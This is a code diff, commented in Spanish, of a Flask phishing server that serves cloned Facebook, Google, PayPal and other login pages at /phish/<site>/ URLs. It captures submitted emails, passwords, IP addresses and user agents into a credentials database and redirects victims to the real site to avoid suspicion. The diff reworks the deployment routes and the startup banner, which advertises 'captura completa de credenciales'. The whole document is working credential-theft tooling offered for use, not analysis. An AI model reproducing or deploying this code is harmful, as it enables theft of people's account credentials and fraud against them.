@@ -9,10 +9,6 @@ from urllib.parse import urlparse
 import sqlite3
 import threading
 import time
-import socket
-import signal
-import sys
-from threading import Thread
 import webbrowser
 
 app = Flask(__name__)
@@ -23,8 +19,7 @@ SITES_DIR = 'sites'
 LOGOS_DIR = 'logos'
 CREDENTIALS_DB = 'credentials.db'
 STATIC_FILES = ['css', 'js', 'png', 'jpg', 'jpeg', 'gif', 'svg', 'ico', 'woff', 'woff2', 'ttf', 'eot']
-BASE_PORT = 5001  # Puerto base para sitios desplegados
-deployed_sites = {}  # Diccionario para trackear sitios desplegados
+deployed_sites = {}  # Diccionario para trackear sitios "desplegados"
 
 # Lock para thread safety
 db_lock = threading.Lock()
@@ -146,8 +141,7 @@ def get_available_sites():
                     'display_name': item.replace('-', ' ').replace('_', ' ').title(),
                     'logo': logo,
                     'deployed': item in deployed_sites,
-                    'port': deployed_sites.get(item, {}).get('port', None),
-                    'url': f"http://localhost:{deployed_sites.get(item, {}).get('port', 'XXXX')}" if item in deployed_sites else None
+                    'url': f"/phish/{item}/" if item in deployed_sites else None
                 })
     return sorted(sites, key=lambda x: x['name'])
 
@@ -195,162 +189,6 @@ def get_site_logo(site_name):
         return f'/logos/{logo_file}'
     
     return None
-
-def find_free_port(start_port=5001):
-    """Encuentra un puerto libre para desplegar el sitio"""
-    port = start_port
-    while port < 6000:  # Limitar rango de puertos
-        if port not in [site_info['port'] for site_info in deployed_sites.values()]:
-            try:
-                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                    s.bind(('localhost', port))
-                    return port
-            except OSError:
-                pass
-        port += 1
-    return None
-
-def create_site_app(site_name, port):
-    """Crea una aplicación Flask independiente para un sitio específico"""
-    site_app = Flask(f'site_{site_name}')
-    site_app.secret_key = f'site_{site_name}_secret'
-    
-    site_info = get_site_info(site_name)
-    if not site_info:
-        return None
-    
-    @site_app.route('/')
-    @site_app.route('/<filename>')
-    def serve_file(filename='index.php'):
-        # Si no se especifica archivo, usar index por defecto
-        if not filename or filename == '':
-            if site_info['has_index']:
-                filename = 'index.php'
-            elif site_info['has_login']:
-                filename = 'login.html'
-            else:
-                return f"Sitio {site_name} desplegado correctamente"
-        
-        file_path = os.path.join(site_info['path'], filename)
-        
-        if not os.path.exists(file_path):
-            return f"Archivo '{filename}' no encontrado", 404
-        
-        # Verificar si es un archivo estático
-        file_ext = filename.split('.')[-1].lower()
-        if file_ext in STATIC_FILES:
-            return send_from_directory(site_info['path'], filename)
-        
-        # Para archivos HTML/PHP, leer y procesar el contenido
-        try:
-            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                content = f.read()
-            
-            # Procesar contenido para actualizar rutas y formularios
-            content = process_site_content_standalone(content, site_name, filename, port)
-            
-            # Determinar el content type
-            if filename.endswith('.html') or filename.endswith('.php'):
-                return content, 200, {'Content-Type': 'text/html; charset=utf-8'}
-            else:
-                return content
-        
-        except Exception as e:
-            return f"Error al cargar archivo: {str(e)}", 500
-    
-    @site_app.route('/login.php', methods=['POST'])
-    @site_app.route('/login', methods=['POST']) 
-    def handle_standalone_login():
-        """Maneja el envío de formularios de login en el sitio independiente"""
-        try:
-            # Obtener datos del formulario
-            form_data = request.form.to_dict()
-            
-            # Extraer credenciales comunes
-            email = form_data.get('email') or form_data.get('username') or form_data.get('user') or form_data.get('login')
-            password = form_data.get('pass') or form_data.get('password') or form_data.get('passwd')
-            
-            # Datos adicionales como JSON
-            extra_data = json.dumps(form_data) if form_data else None
-            
-            # Guardar en la base de datos
-            db_manager.save_credentials(
-                site_name=site_name,
-                email=email,
-                password=password,
-                extra_data=extra_data,
-                ip_address=request.environ.get('HTTP_X_REAL_IP', request.remote_addr),
-                user_agent=request.headers.get('User-Agent')
-            )
-            
-            # Determinar URL de redirección basada en el sitio
-            redirect_urls = {
-                'facebook': 'https://facebook.com/',
-                'google': 'https://accounts.google.com/',
-                'instagram': 'https://instagram.com/',
-                'github': 'https://github.com/',
-                'linkedin': 'https://linkedin.com/',
-                'twitter': 'https://twitter.com/',
-                'netflix': 'https://netflix.com/',
-                'spotify': 'https://spotify.com/',
-                'paypal': 'https://paypal.com/',
-                'microsoft': 'https://microsoft.com/',
-            }
-            
-            redirect_url = redirect_urls.get(site_name, f'https://{site_name}.com/')
-            return redirect(redirect_url)
-        
-        except Exception as e:
-            return f"Error procesando login: {str(e)}", 500
-    
-    return site_app
-
-def process_site_content_standalone(content, site_name, filename, port):
-    """Procesa el contenido del sitio para el servidor independiente"""
-    try:
-        # Actualizar action de formularios para que apunten al servidor local
-        content = content.replace('action="login.php"', f'action="http://localhost:{port}/login.php"')
-        content = content.replace("action='login.php'", f"action='http://localhost:{port}/login.php'")
-        content = content.replace('action="login"', f'action="http://localhost:{port}/login"')
-        
-        # Actualizar enlaces relativos para el servidor independiente
-        content = content.replace('href="login.html"', f'href="http://localhost:{port}/login.html"')
-        content = content.replace('href="index.php"', f'href="http://localhost:{port}/"')
-        content = content.replace('href="mobile.html"', f'href="http://localhost:{port}/mobile.html"')
-        
-        # Actualizar includes PHP
-        content = content.replace("include 'ip.php'", "")
-        content = content.replace('include "ip.php"', "")
-        
-        # Para archivos PHP, comentar el código PHP que no necesitamos
-        if filename.endswith('.php'):
-            content = content.replace("header('Location:", "// header('Location:")
-            content = content.replace('header("Location:', '// header("Location:')
-            content = content.replace("exit();", "// exit();")
-        
-        return content
-    
-    except Exception as e:
-        print(f"Error procesando contenido: {e}")
-        return content
-
-def deploy_site_process(site_name, port):
-    """Despliega un sitio en un thread separado"""
-    try:
-        site_app = create_site_app(site_name, port)
-        if site_app:
-            print(f"Desplegando {site_name} en puerto {port}")
-            site_app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False, threaded=True)
-    except Exception as e:
-        print(f"Error desplegando {site_name}: {e}")
-        # Remover del diccionario si falla
-        if site_name in deployed_sites:
-            del deployed_sites[site_name]
-
-@app.route('/logos/<filename>')
-def serve_logo(filename):
-    """Sirve los logos de los sitios"""
-    return send_from_directory(LOGOS_DIR, filename)
 
 def get_site_info(site_name):
     """Obtiene información sobre un sitio específico"""
@@ -408,47 +246,26 @@ def export_credentials():
 
 @app.route('/deploy/<site_name>')
 def deploy_site(site_name):
-    """Despliega un sitio específico en un puerto independiente"""
+    """Marca un sitio como desplegado"""
     site_info = get_site_info(site_name)
     if not site_info:
         return f"Sitio '{site_name}' no encontrado", 404
     
-    # Verificar si ya está desplegado
-    if site_name in deployed_sites:
-        return redirect(url_for('site_status', site_name=site_name))
+    # Marcar como desplegado
+    deployed_sites[site_name] = {
+        'start_time': datetime.datetime.now(),
+        'url': f'/phish/{site_name}/',
+        'status': 'active'
+    }
     
-    # Encontrar puerto libre
-    port = find_free_port()
-    if not port:
-        return "No hay puertos disponibles para desplegar el sitio", 500
+    # Registrar la visita
+    db_manager.log_visit(
+        site_name=site_name,
+        ip_address=request.environ.get('HTTP_X_REAL_IP', request.remote_addr),
+        user_agent=request.headers.get('User-Agent')
+    )
     
-    try:
-        # Crear thread independiente para el sitio
-        thread = Thread(target=deploy_site_process, args=(site_name, port), daemon=True)
-        thread.start()
-        
-        # Registrar el sitio desplegado
-        deployed_sites[site_name] = {
-            'port': port,
-            'thread': thread,
-            'start_time': datetime.datetime.now(),
-            'url': f'http://localhost:{port}'
-        }
-        
-        # Registrar la visita
-        db_manager.log_visit(
-            site_name=site_name,
-            ip_address=request.environ.get('HTTP_X_REAL_IP', request.remote_addr),
-            user_agent=request.headers.get('User-Agent')
-        )
-        
-        # Esperar un momento para que el servidor se inicie
-        time.sleep(3)
-        
-        return redirect(url_for('site_status', site_name=site_name))
-    
-    except Exception as e:
-        return f"Error desplegando sitio: {str(e)}", 500
+    return redirect(url_for('site_status', site_name=site_name))
 
 @app.route('/site-status/<site_name>')
 def site_status(site_name):
@@ -457,6 +274,7 @@ def site_status(site_name):
         return redirect(url_for('index'))
     
     site_data = deployed_sites[site_name]
+    site_data['url'] = f"http://localhost:5000/phish/{site_name}/"
     return render_template('site_status.html', 
                          site_name=site_name, 
                          site_data=site_data)
@@ -465,34 +283,20 @@ def site_status(site_name):
 def stop_site(site_name):
     """Detiene un sitio desplegado"""
     if site_name in deployed_sites:
-        try:
-            # Para threads no podemos forzar el cierre, solo remover del registro
-            del deployed_sites[site_name]
-            return redirect(url_for('index'))
-        except Exception as e:
-            return f"Error deteniendo sitio: {str(e)}", 500
+        del deployed_sites[site_name]
     return redirect(url_for('index'))
 
-@app.route('/deployed-sites')
-def deployed_sites_status():
-    """API para obtener estado de sitios desplegados"""
-    status = {}
-    for site_name, site_data in deployed_sites.items():
-        status[site_name] = {
-            'port': site_data['port'],
-            'url': site_data['url'],
-            'start_time': site_data['start_time'].isoformat(),
-            'running': site_data['thread'].is_alive()
-        }
-    return jsonify(status)
-
-@app.route('/site/<site_name>/')
-@app.route('/site/<site_name>/<filename>')
-def serve_site_file(site_name, filename='index.php'):
-    """Sirve archivos específicos de un sitio"""
+@app.route('/phish/<site_name>/')
+@app.route('/phish/<site_name>/<filename>')
+def serve_phishing_site(site_name, filename='index.php'):
+    """Sirve el sitio de phishing como si fuera independiente"""
     site_info = get_site_info(site_name)
     if not site_info:
         return f"Sitio '{site_name}' no encontrado", 404
+    
+    # Verificar que esté desplegado
+    if site_name not in deployed_sites:
+        return redirect(url_for('deploy_site', site_name=site_name))
     
     # Si no se especifica archivo, usar index por defecto
     if not filename:
@@ -501,7 +305,7 @@ def serve_site_file(site_name, filename='index.php'):
         elif site_info['has_login']:
             filename = 'login.html'
         else:
-            return f"No se encontró archivo principal para el sitio '{site_name}'"
+            return f"Sitio {site_name} activo - Archivos: {', '.join(site_info['files'])}"
     
     file_path = os.path.join(site_info['path'], filename)
     
@@ -530,9 +334,9 @@ def serve_site_file(site_name, filename='index.php'):
     except Exception as e:
         return f"Error al cargar archivo: {str(e)}", 500
 
-@app.route('/site/<site_name>/login.php', methods=['POST'])
-@app.route('/site/<site_name>/login', methods=['POST'])
-def handle_login(site_name):
+@app.route('/phish/<site_name>/login.php', methods=['POST'])
+@app.route('/phish/<site_name>/login', methods=['POST'])
+def handle_phishing_login(site_name):
     """Maneja el envío de formularios de login"""
     try:
         # Obtener datos del formulario
@@ -579,13 +383,13 @@ def process_site_content(content, site_name, filename):
     """Procesa el contenido del sitio para actualizar rutas y formularios"""
     try:
         # Actualizar action de formularios para que apunten a nuestro handler
-        content = content.replace('action="login.php"', f'action="/site/{site_name}/login.php"')
-        content = content.replace("action='login.php'", f"action='/site/{site_name}/login.php'")
+        content = content.replace('action="login.php"', f'action="/phish/{site_name}/login.php"')
+        content = content.replace("action='login.php'", f"action='/phish/{site_name}/login.php'")
         
         # Actualizar enlaces relativos
-        content = content.replace('href="login.html"', f'href="/site/{site_name}/login.html"')
-        content = content.replace('href="index.php"', f'href="/site/{site_name}/index.php"')
-        content = content.replace('href="mobile.html"', f'href="/site/{site_name}/mobile.html"')
+        content = content.replace('href="login.html"', f'href="/phish/{site_name}/login.html"')
+        content = content.replace('href="index.php"', f'href="/phish/{site_name}/"')
+        content = content.replace('href="mobile.html"', f'href="/phish/{site_name}/mobile.html"')
         
         # Actualizar includes PHP (aunque no los procesaremos realmente)
         content = content.replace("include 'ip.php'", "")
@@ -604,8 +408,39 @@ def process_site_content(content, site_name, filename):
         print(f"Error procesando contenido: {e}")
         return content
 
+@app.route('/logos/<filename>')
+def serve_logo(filename):
+    """Sirve los logos de los sitios"""
+    return send_from_directory(LOGOS_DIR, filename)
+
+# Rutas para compatibilidad con el sistema anterior
+@app.route('/site/<site_name>/')
+@app.route('/site/<site_name>/<filename>')
+def serve_site_file(site_name, filename='index.php'):
+    """Sirve archivos específicos de un sitio (modo preview)"""
+    return serve_phishing_site(site_name, filename)
+
+@app.route('/site/<site_name>/login.php', methods=['POST'])
+@app.route('/site/<site_name>/login', methods=['POST'])
+def handle_login(site_name):
+    """Maneja el envío de formularios de login en modo preview"""
+    return handle_phishing_login(site_name)
+
+@app.route('/deployed-sites')
+def deployed_sites_status():
+    """API para obtener estado de sitios desplegados"""
+    status = {}
+    for site_name, site_data in deployed_sites.items():
+        status[site_name] = {
+            'url': f'/phish/{site_name}/',
+            'start_time': site_data['start_time'].isoformat(),
+            'status': site_data['status']
+        }
+    return jsonify(status)
+
 # Rutas para servir archivos estáticos de sitios
 @app.route('/site/<site_name>/static/<path:filename>')
+@app.route('/phish/<site_name>/static/<path:filename>')
 def serve_static(site_name, filename):
     """Sirve archivos estáticos de los sitios"""
     site_info = get_site_info(site_name)
@@ -613,42 +448,35 @@ def serve_static(site_name, filename):
         return send_from_directory(site_info['path'], filename)
     return "Archivo no encontrado", 404
 
-def cleanup_deployed_sites():
-    """Limpia todos los sitios desplegados al cerrar"""
-    deployed_sites.clear()
-    print("✅ Sitios desplegados limpiados")
-
-def signal_handler(sig, frame):
-    """Maneja la señal de cierre del programa"""
-    print("\n\n🛑 Cerrando servidor y sitios desplegados...")
-    cleanup_deployed_sites()
-    sys.exit(0)
-
 if __name__ == '__main__':
-    # Registrar manejador de señales para limpieza
-    signal.signal(signal.SIGINT, signal_handler)
-    signal.signal(signal.SIGTERM, signal_handler)
-    
     # Crear directorio de templates si no existe
     if not os.path.exists('templates'):
         os.makedirs('templates')
     
-    print("=== SERVIDOR DE PHISHING FLASK ===")
+    print("=== SERVIDOR DE PHISHING FLASK MEJORADO ===")
     print(f"Sitios disponibles: {len([s['name'] for s in get_available_sites()])}")
     print("Iniciando servidor en http://localhost:5000")
     print("Panel de administración: http://localhost:5000/admin")
-    print("Ctrl+C para detener")
-    print("\n🎯 FUNCIONALIDADES:")
-    print("  • Despliegue independiente por puerto")
+    print("")
+    print("🎯 FUNCIONALIDADES:")
+    print("  • Despliegue de sitios con URLs dedicadas")
+    print("  • Sistema /phish/SITIO/ para cada sitio")
     print("  • Logos automáticos de sitios")
     print("  • Captura completa de credenciales")
     print("  • Panel de administración en tiempo real")
+    print("  • Compatible con Windows sin problemas de sockets")
+    print("")
+    print("🌐 EJEMPLOS DE USO:")
+    print("  • Desplegar Facebook: http://localhost:5000/phish/facebook/")
+    print("  • Desplegar Google: http://localhost:5000/phish/google/")
+    print("  • Panel admin: http://localhost:5000/admin")
+    print("")
+    print("Ctrl+C para detener")
     print("")
     
     try:
-        app.run(debug=True, host='0.0.0.0', port=5000)
+        app.run(debug=True, host='0.0.0.0', port=5000, threaded=True)
     except KeyboardInterrupt:
-        cleanup_deployed_sites()
+        print("\n🛑 Servidor detenido")
     except Exception as e:
         print(f"Error: {e}")
-        cleanup_deployed_sites()
